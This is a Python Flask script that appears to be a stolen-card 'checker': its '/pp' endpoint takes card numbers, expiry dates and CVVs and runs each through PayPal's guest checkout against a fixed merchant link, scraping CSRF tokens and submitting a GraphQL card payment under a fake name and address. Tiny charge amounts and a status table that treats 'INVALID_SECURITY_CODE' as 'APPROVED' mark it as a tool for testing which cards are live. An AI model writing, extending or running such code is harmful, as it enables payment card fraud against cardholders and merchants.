import requests
import json
import logging
import re
import time
from flask import Flask, jsonify, request
import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Flask App
app = Flask(__name__)

# --- Status Mapping Rules ---
# Define the sets of codes for each status
APPROVED_CODES = {"INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED"}
DECLINED_CODES = {
    "CARD_GENERIC_ERROR",
    "COUNTRY_NOT_SUPPORTED",
    "EXPIRED_CARD",
    "VALIDATION_ERROR",
    "LOGIN_ERROR",
    "RISK_DISALLOWED",
    "TOKEN_EXTRACTION_ERROR",
    "NETWORK_ERROR",
    "INTERNAL_ERROR",
    "INVALID_MONTH",
    "UNKNOWN_ERROR"
}

def extract_csrf_token(html_content):
    """Extract CSRF token from HTML content with multiple patterns."""
    try:
        patterns = [
            r'"csrfToken":"([^"]+)"',
            r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']',
            r'data-csrf=["\']([^"\']+)["\']',
            r'"token":"([^"]+)"',
            r'name="_token"\s+value="([^"]+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        
        logging.warning(f"CSRF token not found. Page content snippet: {html_content[:500]}...")
        return None
    except Exception as e:
        logging.error(f"Error extracting CSRF token: {e}")
        return None

def process_paypal_payment(card_details_string, amount="1.00"):
    """
    Processes the PayPal payment using the provided card details string.
    The string should be in the format: 'card_number|mm|yy|cvv'
    Returns a dictionary with processing results in the format:
    {"code": "{code}", "message": "{msg}", "status": "{status}"}
    """
    start_time = time.time()
    
    # --- 1. Parse and Validate Card Details ---
    parts = card_details_string.split('|')
    if len(parts) != 4:
        return {
            "code": "VALIDATION_ERROR",
            "message": "Invalid card details format. Expected: card_number|mm|yy|cvv",
            "status": "DECLINED"
        }

    card_number, month, year, cvv = [p.strip() for p in parts]

    if not month.isdigit() or len(month) != 2 or not (1 <= int(month) <= 12):
        return {
            "code": "INVALID_MONTH",
            "message": "Invalid expiration month. Must be between 01 and 12",
            "status": "DECLINED"
        }
    
    if not year.isdigit():
        return {
            "code": "VALIDATION_ERROR",
            "message": "Invalid expiration year format",
            "status": "DECLINED"
        }
    
    if len(year) == 2: 
        year = '20' + year
    elif len(year) != 4: 
        return {
            "code": "VALIDATION_ERROR",
            "message": "Invalid expiration year format",
            "status": "DECLINED"
        }
    
    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        return {
            "code": "VALIDATION_ERROR",
            "message": "Invalid CVV. Must be 3 or 4 digits",
            "status": "DECLINED"
        }

    expiry_date = f"{month}/{year}"
    card_type = 'VISA' if card_number.startswith('4') else ('MASTER_CARD' if card_number.startswith('5') else ('AMEX' if card_number.startswith('3') else 'UNKNOWN'))
    currency_conversion_type = 'VENDOR' if card_type == 'AMEX' else 'PAYPAL'
    card_details = {'cardNumber': card_number, 'type': card_type, 'expirationDate': expiry_date, 'securityCode': cvv, 'postalCode': '10010'}

    # --- 2. Execute PayPal Request Sequence with Comprehensive Retry Logic ---
    
    session = requests.Session()
    token = None
    
    max_acquisition_retries = 3
    for acquisition_attempt in range(max_acquisition_retries):
        csrf_token = None
        max_csrf_retries = 3
        for csrf_attempt in range(max_csrf_retries):
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache', 'Pragma': 'no-cache',
            }
            try:
                response = session.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', headers=headers, timeout=15)
                response.raise_for_status()
                csrf_token = extract_csrf_token(response.text)
                if csrf_token:
                    logging.info(f"Successfully extracted CSRF token on attempt {csrf_attempt + 1}.")
                    break
                else:
                    logging.warning(f"Attempt {csrf_attempt + 1}/{max_csrf_retries}: CSRF token not found. Retrying...")
            except requests.exceptions.RequestException as e:
                logging.warning(f"Attempt {csrf_attempt + 1}/{max_csrf_retries}: Network error while fetching initial page: {e}. Retrying...")
            
            if csrf_attempt < max_csrf_retries - 1:
                time.sleep(2)

        if not csrf_token:
            logging.error(f"Failed to extract CSRF token after {max_csrf_retries} attempts on acquisition try {acquisition_attempt + 1}.")
            if acquisition_attempt < max_acquisition_retries - 1:
                time.sleep(3)
                continue
            else:
                return {
                    "code": "TOKEN_EXTRACTION_ERROR",
                    "message": "Failed to extract CSRF token from PayPal",
                    "status": "DECLINED"
                }

        # --- Request 2: Create Order ---
        headers = {
            'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-csrf-token': csrf_token,
        }
        json_data = {
            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': amount,
            'currency': 'USD', 'currencySymbol': '$', 'funding_source': 'CARD',
            'button_type': 'VARIABLE_PRICE', 'csrfRetryEnabled': True,
        }
        
        try:
            response = session.post('https://www.paypal.com/ncp/api/create-order', cookies=session.cookies, headers=headers, json=json_data, timeout=10)
            response.raise_for_status()
            response_data = response.json()
        except requests.exceptions.RequestException as e:
            logging.error(f"Network error during create-order call on acquisition try {acquisition_attempt + 1}: {e}")
            if acquisition_attempt < max_acquisition_retries - 1:
                time.sleep(3)
                continue
            else:
                return {
                    "code": "NETWORK_ERROR",
                    "message": "Network error while creating PayPal order",
                    "status": "DECLINED"
                }
        except ValueError:
            logging.error(f"Invalid JSON response from create-order on acquisition try {acquisition_attempt + 1}: {response.text}")
            if acquisition_attempt < max_acquisition_retries - 1:
                time.sleep(3)
                continue
            else:
                return {
                    "code": "TOKEN_EXTRACTION_ERROR",
                    "message": "Invalid response from PayPal order creation",
                    "status": "DECLINED"
                }
        
        if 'context_id' in response_data:
            token = response_data['context_id']
            logging.info(f"Successfully extracted token: {token}")
            break
        else:
            logging.error(f"Token extraction failed on acquisition try {acquisition_attempt + 1}. Status: {response.status_code}. Response Body: {response.text}")
            if acquisition_attempt < max_acquisition_retries - 1:
                logging.warning("Retrying entire token acquisition process...")
                time.sleep(3)
                continue

    if not token:
        logging.error(f"Failed to extract token after {max_acquisition_retries} full acquisition attempts.")
        return {
            "code": "TOKEN_EXTRACTION_ERROR",
            "message": "Failed to extract payment token from PayPal",
            "status": "DECLINED"
        }

    # --- Request 3: Submit Card Details ---
    headers = {
        'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
        'paypal-client-context': token, 'paypal-client-metadata-id': token,
        'referer': f'https://www.paypal.com/smart/card-fields?token={token}',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-app-name': 'standardcardfields', 'x-country': 'US',
    }

    graphql_query = """
    mutation payWithCard(
        $token: String!
        $card: CardInput
        $paymentToken: String
        $phoneNumber: String
        $firstName: String
        $lastName: String
        $shippingAddress: AddressInput
        $billingAddress: AddressInput
        $email: String
        $currencyConversionType: CheckoutCurrencyConversionType
        $installmentTerm: Int
        $identityDocument: IdentityDocumentInput
        $feeReferenceId: String
    ) {
        approveGuestPaymentWithCreditCard(
            token: $token
            card: $card
            paymentToken: $paymentToken
            phoneNumber: $phoneNumber
            firstName: $firstName
            lastName: $lastName
            email: $email
            shippingAddress: $shippingAddress
            billingAddress: $billingAddress
            currencyConversionType: $currencyConversionType
            installmentTerm: $installmentTerm
            identityDocument: $identityDocument
            feeReferenceId: $feeReferenceId
        ) {
            flags {
                is3DSecureRequired
            }
            cart {
                intent
                cartId
                buyer {
                    userId
                    auth {
                        accessToken
                    }
                }
                returnUrl {
                    href
                }
            }
            paymentContingencies {
                threeDomainSecure {
                    status
                    method
                    redirectUrl {
                        href
                    }
                    parameter
                }
            }
        }
    }
    """
    
    json_data = {
        'query': graphql_query.strip(),
        'variables': {
            'token': token, 'card': card_details, 'phoneNumber': '4073320637',
            'firstName': 'Rockcy', 'lastName': 'og',
            'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
            'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
            'email': 'rocky2@gmail.com', 'currencyConversionType': currency_conversion_type,
        }, 'operationName': None,
    }
    
    try:
        response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=session.cookies, headers=headers, json=json_data, timeout=20)
        response_data = response.json()
    except (ValueError, requests.exceptions.RequestException) as e:
        logging.error(f"Final GraphQL request failed: {e}. Response: {response.text}")
        return {
            "code": "INTERNAL_ERROR",
            "message": "Internal error during payment processing",
            "status": "DECLINED"
        }

    # --- 3. Parse PayPal Response and Format Result ---
    end_time = time.time()
    processing_time = f"{end_time - start_time:.2f}s"
    
    result_code = 'TRANSACTION_SUCCESSFUL'
    result_message = 'Payment processed successfully.'
    
    if 'errors' in response_data and response_data['errors']:
        logging.error(f"PayPal GraphQL error: {json.dumps(response_data)}")
        error_data = response_data['errors'][0]
        result_code = error_data.get('data', [{}])[0].get('code', 'UNKNOWN_ERROR')
        result_message = error_data.get('message', 'An unknown error occurred.')
    
    # Format the result according to your desired output
    if result_code in APPROVED_CODES:
        status = 'APPROVED'
    elif result_code in DECLINED_CODES:
        status = 'DECLINED'
    else:
        status = 'CHARGED'
    
    return {
        "code": result_code,
        "message": result_message,
        "status": status
    }


@app.route('/pp')
def payment_gateway():
    """
    Main endpoint to process a payment.
    URL Format: /pp?cc=card_number|mm|yy|cvv&amount=0.01
    Returns only: {"code": "{code}", "message": "{msg}", "status": "{status}"}
    """
    card_details = request.args.get('cc', '')
    amount = request.args.get('amount', '0.01')
    
    last_four = card_details.split('|')[0][-4:] if '|' in card_details and len(card_details.split('|')[0]) >= 4 else '****'
    logging.info(f"Received payment request for card ending in {last_four}, amount: {amount}")
    
    result = process_paypal_payment(card_details, amount)
    
    logging.info(f"Transaction result: {result}")
    return jsonify(result)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
